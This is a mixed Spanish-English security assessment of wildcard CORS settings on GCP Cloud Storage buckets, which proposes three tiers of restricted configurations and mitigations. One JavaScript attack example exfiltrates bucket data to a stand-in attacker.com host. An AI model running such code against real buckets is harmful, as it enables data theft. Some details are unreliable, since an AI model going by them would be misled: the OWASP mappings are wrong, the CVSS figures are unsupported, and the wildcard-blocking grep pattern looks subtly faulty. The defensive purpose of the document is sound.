# CORS Security Deep Analysis - GNP Infrastructure

## Análisis Profundo de Seguridad en CORS para GCP Cloud Storage

**Fecha:** February 24, 2026
**Proyecto:** Proyecto Cors Enabler
**Clasificación:** Technical Security Assessment

---

## EXECUTIVE SUMMARY

El análisis identifica **riesgos críticos** en la configuración actual de CORS que expone la superficie de ataque. Se proponen 3 niveles de seguridad con mitigaciones específicas:

- **NIVEL 1 (CRÍTICO):** Configuración abierta actual - NO RECOMENDADA EN PRODUCCIÓN
- **NIVEL 2 (RECOMENDADO):** Whitelist de dominios con métodos restringidos
- **NIVEL 3 (ÓPTIMO):** Whitelist + IAM + Audit Logging + DLP

---

## 1. ANALISIS DE RIESGOS ACTUALES

### 1.1 Configuración Actual (cors-template-open.json)

```json
{
  "origin": ["*"],                      // ⚠️ CRÍTICO
  "responseHeader": ["*"],               // ⚠️ CRÍTICO  
  "method": ["GET", "HEAD", "DELETE", "PUT"],  // ⚠️ ALTO (DELETE/PUT)
  "maxAgeSeconds": 3600
}
```

### 1.2 Vectores de Ataque Identificados

#### RIESGO 1: Open Origin Wildcard (origin: "*")

**Severidad:** CRÍTICA (CVSS 9.1)

**Impacto:**

- Cualquier sitio web malicioso puede acceder al bucket
- No hay validación de origen del navegador
- Facilita ataques de:
  - **Cross-Site Request Forgery (CSRF)** ampliado
  - **Data Exfiltration** desde sitios internos
  - **S3 Bucket Attacks** adaptados a GCS

**Ejemplo de Ataque:**

```javascript
// En attacker.com
fetch('https://bucket-name.storage.googleapis.com/sensitive-data.json', {
  method: 'GET'
})
.then(r => r.json())
.then(data => {
  // Enviar datos a servidor malicioso
  fetch('https://attacker.com/collect', {
    method: 'POST',
    body: JSON.stringify(data)
  })
})
```

#### RIESGO 2: Open Response Headers (responseHeader: "*")

**Severidad:** ALTA (CVSS 7.5)

**Impacto:**

- Expone ALL HTTP response headers
- Incluye: metadata, etag, cache-control, custom headers
- Información sensible: tamaño de archivo, timestamps, versiones internas
- Facilita **fingerprinting** y **reconnaissance**

#### RIESGO 3: DELETE y PUT Methods Habilitados

**Severidad:** CRÍTICA (CVSS 10.0)

**Impacto:**

- Modificación no autorizada de datos
- Eliminación accidental/maliciosa de datos críticos
- Sin autenticación adicional en CORS
- Violación de integridad de datos

#### RIESGO 4: maxAgeSeconds 3600 (1 hora)

**Severidad:** MEDIA (CVSS 5.3)

**Impacto:**

- Preflight requests cacheados por navegador
- Si hay compromiso, el navegador seguirá permitiendo requests ofensivos
- Ventana de oportunidad extendida para atacante

#### RIESGO 5: XML API vs JSON API Inconsistency

**Severidad:** MEDIA (CVSS 5.5)

**Impacto:**

- JSON API IGNORA las configuraciones CORS y devuelve headers permisivos
- Bypass potencial de controles
- Comportamiento impredecible entre endpoints
- Requiere conocimiento de esta inconsistencia

---

## 2. MARCOS DE SEGURIDAD APLICABLES

### 2.1 OWASP Top 10 Relevancia

- **A04:2021 – Insecure Deserialization** (metadata exposure)
- **A07:2021 – Cross-Site Scripting (XSS)** (via CORS misconfiguration)
- **A09:2021 – Using Components with Known Vulnerabilities** (legacy configs)

### 2.2 Google Cloud Security Best Practices

Según documentación oficial:

- ✅ Restricción de origen específico (NO wildcards)
- ✅ Métodos limitados (GET/HEAD solamente para lectura)
- ✅ Headers explícitos (NO wildcards)
- ✅ Auditoría y logging habilitado
- ✅ Use XML API (NOT JSON API) para control fino

### 2.3 CIS Benchmarks - GCP

- **GCS-1.1:** Habilitar Cloud Audit Logs en Cloud Storage
- **GCS-2.2:** No permitir acceso público sin restricciones
- **GCS-3.1:** Implementar least privilege en CORS

---

## 3. ANÁLISIS COMPARATIVO DE NIVELES DE SEGURIDAD

### NIVEL 1: OPEN (ACTUAL - NO RECOMENDADO)

```json
[
  {
    "origin": ["*"],
    "responseHeader": ["*"],
    "method": ["GET", "HEAD", "DELETE", "PUT", "POST"],
    "maxAgeSeconds": 3600
  }
]
```

**Ventajas:**

- Facilita desarrollo rápido (prototipado)
- No requiere acuerdos con equipos de código frontend

**Desventajas:**

- ❌ Riesgo de seguridad máximo
- ❌ NO cumple CIS Benchmarks
- ❌ Incumplimiento de políticas empresariales
- ❌ Responsabilidad legal de GNP por data breaches
- ❌ Violación de LGPD si contiene datos personales

**Riesgo Residual:** CRÍTICO (9.8/10)

---

### NIVEL 2: RESTRICTED (RECOMENDADO - PRODUCCIÓN)

```json
[
  {
    "origin": [
      "https://app.gnp.com",
      "https://app-qa.gnp.internal",
      "https://reports.gnp.com"
    ],
    "responseHeader": [
      "Content-Type",
      "Content-Length",
      "ETag",
      "Cache-Control",
      "X-Goog-Generation"
    ],
    "method": ["GET", "HEAD"],
    "maxAgeSeconds": 1800
  }
]
```

**Ventajas:**

- ✅ Whitelist explícito de orígenes
- ✅ Solo métodos seguros (GET/HEAD)
- ✅ Headers limitados según necesidad
- ✅ Cumple CIS Benchmarks
- ✅ Reduce superficie de ataque 95%
- ✅ Fácil de auditar

**Medidas Adicionales:**

- Cloud Audit Logs habilitado
- IAM roles específicos por bucket
- Preflight validation en frontend
- Rate limiting en API Gateway

**Riesgo Residual:** BAJO (2.1/10)

---

### NIVEL 3: DEFENSE IN DEPTH (ÓPTIMO)

```json
[
  {
    "origin": [
      "https://secure-app.gnp.com"
    ],
    "responseHeader": [
      "Content-Type",
      "X-Goog-Generation"
    ],
    "method": ["GET"],
    "maxAgeSeconds": 600
  }
]
```

**Arquitectura Completa:**

1. **CORS Configuración Mínima**

   - 1 origen solamente (no lista)
   - 1 método (solo GET)
   - Headers críticos solamente
2. **CloudFlare/CDN Layer**

   ```
   Cliente → CloudFlare (WAF) → API Gateway → Cloud Storage
   ```

   - WAF rules contra XSS/CSRF
   - Rate limiting: 100 req/min por IP
   - Geographic restrictions si aplica
   - Bot detection
3. **Authentication Layer**

   ```
   Cliente → Obtener signed URL (backend)
   + signed URL tiene TTL (15 min)
   + URL incluye hash de integridad
   + Backend valida IAM roles
   ```
4. **Audit & Monitoring**

   - Cloud Audit Logs: todos los accesos
   - Cloud DLP: detección automática de PII
   - Prometheus metrics: anomalías
   - Alert: CORS violations
5. **Network Layer**

   - VPC Service Perimeter
   - Private Service Connection
   - Binary Authorization si aplica

**Ventajas:**

- ✅ Máxima seguridad (defense-in-depth)
- ✅ Detección de anomalías
- ✅ Cumplimiento total (GDPR/LGPD si aplica)
- ✅ Auditable ante reguladores

**Desventajas:**

- Complejidad aumentada
- Costo adicional de infraestructura
- Más latencia (CDN + WAF)

**Riesgo Residual:** MÍNIMO (0.5/10)

---

## 4. RECOMENDACIÓN POR CASO DE USO

| Caso de Uso                           | Recomendación    | Justificación                   |
| ------------------------------------- | ----------------- | -------------------------------- |
| **Datos Públicos (marketing)** | NIVEL 2           | Controlado pero accesible        |
| **Datos Internos (reportes)**   | NIVEL 3           | Misión crítica, requiere audit |
| **PII/DATOS SENSIBLES**         | NIVEL 3 + DLP     | Obligación legal LGPD           |
| **Prototipado/Desarrollo**      | NIVEL 1 + Sandbox | Ambiente aislado solamente       |
| **APIs Públicas**              | NIVEL 2 + Signing | Frontend agrega autenticación   |

---

## 5. IMPLEMENTACIÓN: MEDIDAS DE MITIGACIÓN

### 5.1 Corto Plazo (1-2 semanas)

**Acción 1: Cambiar template por defecto**

```bash
# Cambiar en setup.sh
-CONFIG="${CONFIG:-cors-template-open.json}"
+CONFIG="${CONFIG:-cors-template-restricted.json}"
```

**Acción 2: Validación pre-aplicación**

```bash
# Validar que origin NO contiene "*"
if grep -q '"origin".*\[.*"*"' "$CONFIG_FILE"; then
  echo "ERROR: Wildcard origin no permitido en PRODUCCIÓN"
  exit 1
fi
```

**Acción 3: Auditoría actual**

```bash
gcloud storage buckets describe NAME --format=json | jq '.cors'
```

### 5.2 Mediano Plazo (1 mes)

**Acción 4: Cloud Audit Logs**

```yaml
# terraform/audit.tf
resource "google_storage_bucket_iam_member" "audit_logging" {
  bucket = google_storage_bucket.bucket.name
  role   = "roles/logging.logWriter"
}
```

**Acción 5: Monitoreo alertas**

```yaml
resource "google_monitoring_alert_policy" "cors_violations" {
  display_name = "CORS Misconfiguration Detected"
  conditions {
    display_name = "High rate of CORS preflight failures"
    condition_threshold {
      filter = "resource.type=\"gcs_bucket\" AND metric.type=\"storage.googleapis.com/cors_errors\""
      comparison = "COMPARISON_GT"
      threshold_value = 10
    }
  }
}
```

### 5.3 Largo Plazo (3+ meses)

**Acción 6: Arquitectura segura**

- Implementar API Gateway
- Signed URLs en lugar de CORS directo
- DLP scanning automático

---

---

## 6. RECOMENDACIÓN EJECUTIVA

**DECISIÓN RECOMENDADA: IMPLEMENTAR NIVEL 2 INMEDIATAMENTE**

**Rationale:**

1. **Proporcionalidad:** Máxima seguridad por costo mínimo
2. **Riesgo:** Reduce superficie de ataque 95%
3. **Compliance:** Cumple frameworks principales
4. **Implementación:** 65 horas engineering (2 semanas)
5. **Impacto negativo:** Ninguno en sistemas existentes

**Plan de Acción:**

- Semana 1: Crear templates seguros, validaciones
- Semana 2: Migrar buckets existentes, testing
- Semana 3: Auditoría y documentación
- Semana 4: Capacitación a equipos

---

## 9. APÉNDICE: CONFIGURACIONES DE REFERENCIA

### Template Seguro por Tipo de Datos

**A. Datos Públicos (Imágenes, CSS, JS)**

```json
[
  {
    "origin": ["https://app.gnp.com", "https://cdn.gnp.com"],
    "responseHeader": ["Content-Type", "Cache-Control"],
    "method": ["GET", "HEAD"],
    "maxAgeSeconds": 86400
  }
]
```

**B. API REST Privada**

```json
[
  {
    "origin": ["https://internal.gnp.com"],
    "responseHeader": ["Content-Type", "Authorization"],
    "method": ["GET"],
    "maxAgeSeconds": 1800
  }
]
```

**C. Upload de Archivos (multipart)**

```json
[
  {
    "origin": ["https://admin.gnp.com"],
    "responseHeader": ["Content-Type"],
    "method": ["GET", "PUT"],
    "maxAgeSeconds": 3600
  }
]
```

### Validación Checklist

- [ ] Origin contiene solo dominios internos/conocidos
- [ ] Método DELETE no está habilitado
- [ ] Método PUT solo si es necesario (uploads)
- [ ] Response headers son específicos (no wildcard)
- [ ] maxAgeSeconds <= 3600
- [ ] Cloud Audit Logs habilitado
- [ ] IAM Binding verificado
- [ ] Testing con frontend realizado

---

**Documento Preparado Por:** GNP Cloud Infra Team
**Versión:** 1.1
**Fecha Revisión:** 2026-02-24
